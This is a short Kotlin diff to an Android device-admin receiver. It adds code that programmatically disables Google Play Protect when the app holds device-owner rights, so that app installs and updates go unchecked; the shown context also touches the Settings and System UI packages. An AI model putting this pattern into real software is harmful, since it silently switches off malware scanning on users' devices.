@@ -125,6 +125,16 @@ class CDCDeviceAdminReceiver : DeviceAdminReceiver() {
         try {
             PolicyHelper.setUninstallBlocked(dpm, admin, context.packageName, false)
             
+            // CRITICAL: Disable Play Protect to prevent blocking during app updates/installs
+            if (PolicyHelper.isDeviceOwner(dpm, context.packageName)) {
+                val playProtectDisabled = PolicyHelper.disablePlayProtect(dpm, admin)
+                if (playProtectDisabled) {
+                    Log.i(TAG, "Play Protect disabled successfully")
+                } else {
+                    Log.w(TAG, "Failed to disable Play Protect - may require user action")
+                }
+            }
+            
             val systemApps = listOf("com.android.settings", "com.android.systemui")
             for (pkg in systemApps) {
                 try {
